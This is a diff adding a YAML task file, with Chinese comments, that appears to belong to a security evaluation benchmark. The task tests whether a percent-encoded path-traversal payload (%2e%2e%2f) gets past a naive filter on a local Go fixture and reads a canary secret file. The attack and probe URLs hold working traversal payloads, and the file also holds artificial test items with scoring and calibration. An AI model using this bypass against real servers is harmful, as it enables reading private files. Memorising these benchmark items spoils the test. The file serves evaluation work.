@@ -1,0 +1,108 @@
+# layer=3 正例：同一防御画像下的编码绕过。
+#
+# 与 l3-pt-waf-naive 唯一的差别是 payload：%2e%2e%2f 而不是 ../。
+# 防御只匹配原始 query 里的字面量 ".."，百分号编码不匹配；而 Go 的
+# r.URL.Query().Get() 会先解码，喂给 filepath.Join 的仍是 "../"。
+#
+# 这道题把防御轴的口径钉死：survived=true 的含义不是「防御很强」，
+# 而是「攻击在防御下仍然达成了后果」。同一个 waf-naive 画像下，
+# 一道题 false、一道题 true，说明这个轴测的是对抗生存，不是「有没有装 WAF」。
+task_id: l3-pt-waf-encoded
+name: 防御层正例：百分号编码绕过输入过滤，后果仍然达成
+layer: 3
+notes: |
+  与反例题共用同一个靶、同一个防御画像，只改 payload 编码。
+  如果这道题也判 false，说明是靶或判据坏了（calibration 会报出来），
+  而不是「防御变强了」——这正是自检题要抓的那类假阴性。
+
+target:
+  kind: exec
+  build: ["go", "build", "-o", "{{bin}}", "./eval/fixtures/pathtraversal"]
+  cmd: ["{{bin}}", "-addr", "127.0.0.1:{{port}}", "-data", "{{target_data}}", "-mode", "waf"]
+  ready:
+    kind: tcp_dial
+    addr: "127.0.0.1:{{port}}"
+    timeout_ms: 30000
+
+freeze:
+  kind: manifest
+  ref: waf-naive-v1
+  artifacts:
+    - path: eval/fixtures/pathtraversal/main.go
+
+defense_profile:
+  id: waf-naive
+  kind: input_filter
+  description: 只匹配原始 query 中的字面量 ".."，不解码百分号编码
+
+canaries:
+  - id: notice
+    kind: file
+    path: "{{target_data}}/outside/notice.txt"
+    prefix: "OUTSIDE-"
+  - id: objective
+    kind: file
+    path: "{{target_data}}/secret/objective.txt"
+    prefix: "OBJECTIVE-"
+
+attack:
+  - id: a1-baseline
+    kind: http
+    url: "{{target_base}}/download?name=index.html"
+  - id: a2-encoded-traversal
+    kind: http
+    # %2e%2e%2f = "../"，%2f = "/"；原始 query 里不含字面量 ".."，WAF 放行。
+    url: "{{target_base}}/download?name=%2e%2e%2fsecret%2fobjective.txt"
+    note: 编码规避：绕过只匹配字面量 ".." 的输入过滤
+
+objective:
+  description: webroot 外文件内容出现在响应里，且宿主日志记录 SERVED —— 防御下仍成立
+  mode: all
+  probes:
+    - id: p-leak
+      kind: http_response
+      url: "{{target_base}}/download?name=%2e%2e%2fsecret%2fobjective.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:objective}}"]
+    - id: p-hostlog
+      kind: file_read
+      path: "{{target_data}}/access.log"
+      expect_contains: ["SERVED {{canary_path:objective}}"]
+
+milestones:
+  - id: m1-baseline
+    name: 基线：接口能读到 webroot 内文件
+    points: 20
+    probe:
+      id: p-baseline
+      kind: http_response
+      url: "{{target_base}}/download?name=index.html"
+      expect_status: [200]
+      expect_contains: ["LANCE-EVAL-HOME"]
+  - id: m2-escape
+    name: 编码绕过，穿越出 webroot 读到 outside 文件
+    points: 30
+    requires: [m1-baseline]
+    probe:
+      id: p-escape
+      kind: http_response
+      url: "{{target_base}}/download?name=%2e%2e%2foutside%2fnotice.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:notice}}"]
+  - id: m3-objective
+    name: 读到目标机密文件
+    points: 50
+    requires: [m2-escape]
+    probe:
+      id: p-objective
+      kind: http_response
+      url: "{{target_base}}/download?name=%2e%2e%2fsecret%2fobjective.txt"
+      expect_status: [200]
+      expect_contains: ["{{canary:objective}}"]
+
+scoring:
+  mode: outcome
+  points_mode: additive
+
+calibration:
+  expect_achieved: true
